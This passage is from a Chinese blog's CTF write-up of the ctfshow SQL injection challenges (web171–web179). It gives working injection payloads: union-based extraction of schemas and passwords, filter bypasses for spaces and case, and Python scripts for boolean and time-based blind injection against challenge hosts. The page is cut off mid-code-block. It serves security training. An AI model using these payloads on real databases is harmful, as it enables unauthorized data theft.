<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="SQL注入练习"><title>ctfshowSql注入</title><link rel=canonical href=https://baozongwi.xyz/p/ctfshow-sql-injection/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="ctfshowSql注入"><meta property='og:description' content="SQL注入练习"><meta property='og:url' content='https://baozongwi.xyz/p/ctfshow-sql-injection/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='姿势'><meta property='article:tag' content='mysql'><meta property='article:published_time' content='2025-04-29T16:33:07+00:00'><meta property='article:modified_time' content='2025-04-29T16:33:07+00:00'><meta name=twitter:title content="ctfshowSql注入"><meta name=twitter:description content="SQL注入练习"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#web171>web171</a></li><li><a href=#web172>web172</a></li><li><a href=#web173>web173</a></li><li><a href=#web174>web174</a></li><li><a href=#web175>web175</a></li><li><a href=#web176>web176</a></li><li><a href=#web177>web177</a></li><li><a href=#web178>web178</a></li><li><a href=#web179>web179</a></li><li><a href=#web180>web180</a></li><li><a href=#web181>web181</a></li><li><a href=#web182>web182</a></li><li><a href=#web183>web183</a></li><li><a href=#web184>web184</a></li><li><a href=#web185>web185</a></li><li><a href=#web186>web186</a></li><li><a href=#web187>web187</a></li><li><a href=#web188>web188</a></li><li><a href=#web189>web189</a></li><li><a href=#web190>web190</a></li><li><a href=#web191>web191</a></li><li><a href=#web192>web192</a></li><li><a href=#web193194>web193\194</a></li><li><a href=#web195>web195</a></li><li><a href=#web196>web196</a></li><li><a href=#web197web200>web197–web200</a></li><li><a href=#web214>web214</a></li><li><a href=#web215>web215</a></li><li><a href=#web216>web216</a></li><li><a href=#web217>web217</a></li><li><a href=#web218>web218</a></li><li><a href=#web219>web219</a></li><li><a href=#web220>web220</a></li><li><a href=#web221>web221</a></li><li><a href=#web222>web222</a></li><li><a href=#web223>web223</a></li><li><a href=#web224>web224</a></li><li><a href=#web225>web225</a></li><li><a href=#web226>web226</a></li><li><a href=#web227>web227</a></li><li><a href=#web228>web228</a></li><li><a href=#web229>web229</a></li><li><a href=#web230>web230</a></li><li><a href=#web231>web231</a></li><li><a href=#web232>web232</a></li><li><a href=#web233>web233</a></li><li><a href=#web234>web234</a></li><li><a href=#web235>web235</a></li><li><a href=#web236>web236</a></li><li><a href=#web237>web237</a></li><li><a href=#web238>web238</a></li><li><a href=#web239>web239</a></li><li><a href=#web240>web240</a></li><li><a href=#web241>web241</a></li><li><a href=#web242>web242</a></li><li><a href=#web243>web243</a></li><li><a href=#web244>web244</a></li><li><a href=#web245>web245</a></li><li><a href=#web246>web246</a></li><li><a href=#web247>web247</a></li><li><a href=#web248>web248</a></li><li><a href=#web249>web249</a></li><li><a href=#web250>web250</a></li><li><a href=#web251>web251</a></li><li><a href=#web252>web252</a></li><li><a href=#web253>web253</a></li><li><a href=#小结>小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/ctfshow-sql-injection/>ctfshowSql注入</a></h2><h3 class=article-subtitle>SQL注入练习</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-04-29T16:33:07Z>Apr 29, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>25 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 291 天前，文中的内容可能已有所发展或发生改变。</span></div><p>有一些师傅在去年就开始看我博客了，但是我还弄了一个每月计划，其中我最想写的是mysql注入，当时草草的看了看狗哥写的一篇文章让我看的也很想写，很想记录一下这些东西，顺便练习一下如何去写脚本，恰逢这几天，有不少师傅都在问，我就从ctfshow的SQL注入模块来学习一下一些有趣的姿势，简单的写写exp</p><h2 id=web171>web171</h2><p>万能密码<code>1'||1%23</code></p><h2 id=web172>web172</h2><p>直接联合注入就好了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; union select 1,2,3%23
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=o>%</span><span class=mi>23</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; union select group_concat(schema_name),2 from information_schema.schemata%23
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>),</span><span class=mi>2</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s2>&#34;ctfshow_web&#34;</span><span class=o>%</span><span class=mi>23</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; union select group_concat(column_name),2 from information_schema.columns where table_name=&#34;ctfshow_user2&#34;%23
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=n>password</span><span class=p>),</span><span class=mi>2</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_user2</span><span class=o>%</span><span class=mi>23</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=web173>web173</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39; union select 1,database(),3 --+
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>-1&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>),</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;ctfshow_web&#39;</span><span class=w> </span><span class=c1>--+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>-</span><span class=mi>1</span><span class=s1>&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;</span><span class=n>ctfshow_user3</span><span class=s1>&#39; --+
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>-1&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>to_base64</span><span class=p>(</span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_user3</span><span class=w> </span><span class=c1>--+
</span></span></span></code></pre></td></tr></table></div></div><p>方法一样，换个函数</p><h2 id=web174>web174</h2><p>没有数据页了，那就盲注一下吧，可以直接猜到表名和列名，所以测测就可以打</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; and 1=if(ascii(substr((select group_concat(password) from ctfshow_user4),1,1))&gt;1,1,0)--+
</span></span></code></pre></td></tr></table></div></div><p>用二分法比较快，个人也比较喜欢，除非非要使用字符集来打，不然都是写的这类脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://941d949a-5fef-41da-8abd-6594f601ee1c.challenge.ctf.show/api/v4.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span> <span class=o>=</span> <span class=mi>127</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span> <span class=o>&lt;</span> <span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>head</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span> <span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># payload = f&#39;&#39;&#39;1&#39; and 1=if(ascii(substr((select group_concat(password) from ctfshow_user4),{i},1))&gt;{mid},1,0)--+&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;&#39;&#39;1&#39; and 1=if(ascii(substr((select password from ctfshow_user4 limit 24,1),</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>,1))&gt;</span><span class=si>{</span><span class=n>mid</span><span class=si>}</span><span class=s1>,1,0)--+&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;?id=&#34;</span><span class=o>+</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;admin&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span> <span class=o>=</span> <span class=n>mid</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span> <span class=o>!=</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web175>web175</h2><p>有权限写文件，也可以时间盲注，我写个脚本还是，后面比赛发现<code>try\catch</code>模块容易出问题，所以不写那一种写法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://f77c567a-e676-4d00-90f0-7ee558acbfd1.challenge.ctf.show/api/v5.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>DELAY_THRESHOLD</span><span class=o>=</span><span class=mi>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span> <span class=o>=</span> <span class=mi>127</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span> <span class=o>&lt;</span> <span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>head</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span> <span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;&#39;&#39;1&#39; and 1=if(ascii(substr((select password from ctfshow_user5 limit 24,1),</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>,1))&gt;</span><span class=si>{</span><span class=n>mid</span><span class=si>}</span><span class=s1>,sleep(5),0)--+&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;?id=&#34;</span><span class=o>+</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>request_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start_time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>request_time</span> <span class=o>&gt;=</span> <span class=n>DELAY_THRESHOLD</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Delay triggered! ASCII &gt; </span><span class=si>{</span><span class=n>mid</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span> <span class=o>=</span> <span class=n>mid</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;No delay. ASCII &lt;= </span><span class=si>{</span><span class=n>mid</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=n>head</span> <span class=o>!=</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>没关打印，给自己看跑的过程也还不错，因为时间还真是挺久的，这里说一个小点，有时候<code>sleep(5)</code>网站并不一定会休眠5秒，所以要看，而且避免网络波动导致的原因，最好是把时间弄长点</p><h2 id=web176>web176</h2><p>大小写绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;union sElect 1,2,group_concat(password) from ctfshow_user--+
</span></span></span></code></pre></td></tr></table></div></div><h2 id=web177>web177</h2><p><code>/**/</code>绕过空格</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#39;</span><span class=n>flag</span><span class=s1>&#39;%23
</span></span></span></code></pre></td></tr></table></div></div><h2 id=web178>web178</h2><p><code>%09</code>绕过空格</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;%09union%09select%091,2,password%09from%09ctfshow_user%23
</span></span></span></code></pre></td></tr></table></div></div><h2 id=web179>web179</h2><p><code>%0c</code>绕过空格</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
